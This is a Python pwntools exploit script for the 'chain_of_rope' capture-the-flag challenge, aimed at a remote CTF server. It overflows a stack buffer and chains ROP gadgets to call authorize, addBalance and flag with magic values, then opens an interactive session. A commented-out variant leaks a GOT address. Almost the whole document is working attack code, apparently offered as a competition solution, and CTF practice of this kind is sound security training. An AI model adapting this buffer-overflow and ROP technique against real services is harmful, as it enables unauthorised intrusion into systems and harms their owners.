from pwn import *

#context(os='linux', arch='i386')
#context.log_level = 'debug'

e = ELF("./chain_of_rope")
#p = process("./chain_of_rope")
p = remote("shell.actf.co",19400)

#for symbol in e.symbols:
#	print symbol, hex(e.symbols[symbol])
p.recv()

'''
system_addr = e.symbols["system"]
puts_plt = e.symbols["puts"]
setvbuf_got = e.symbols["got.setvbuf"]
pop_rdi = int("401403", 16)
main = e.symbols["main"]


buff = '1\n'+'A'*(0x30+8)

payload = buff + p64(pop_rdi) + p64(setvbuf_got) + p64(puts_plt) + p64(main)

p.sendline(payload)
'''
buff = '1\n'+'A'*(0x30+8)
auth = e.symbols["authorize"]
main = e.symbols["main"]
pop_rdi = int("0x401403", 16)
addBalance = e.symbols["addBalance"]
pop_rsi_r15 = int("0x401401", 16)
flag = e.symbols["flag"]

payload = buff + p64(auth) + p64(pop_rdi) + p64(int("0xdeadbeef", 16)) + p64(addBalance) + p64(pop_rdi) + p64(int("0xba5eba11", 16)) + p64(pop_rsi_r15) + p64(int("0xbedabb1e", 16)) + p64(int("0xba5eba11", 16)) + p64(flag) +p64(main) 
p.sendline(payload)

data = p.recv()#+'\x00\x00'
print data#hex(u64(data))
p.interactive()
